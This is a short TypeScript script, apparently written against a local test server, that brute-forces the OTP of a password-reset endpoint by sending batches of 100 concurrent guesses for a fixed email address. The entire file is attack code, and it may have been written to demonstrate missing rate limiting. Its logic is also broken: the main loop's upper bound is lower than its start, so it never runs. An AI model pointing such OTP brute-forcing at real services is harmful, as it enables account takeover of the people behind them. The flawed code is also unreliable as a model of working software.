import axios from "axios";

async function attack(id: string) {
  let data = JSON.stringify({
    email: "khati@gmail.com",
    otp: id,
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/rest-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };
  try {
    await axios.request(config).then((response) => {});
  } catch (e) {}
}

// for (let i = 752713; i <= 759713; i++) {
//   console.log(i);
//    attack(i.toString());
// }

async function main() {
  for (let i = 630881; i <= 63881; i += 100) {
    let p = [];
    console.log(i);
    for (let j = 0; j < 100; j++) {
      p.push(attack((i + j).toString()));
    }
    await Promise.all(p);
  }
}
main()
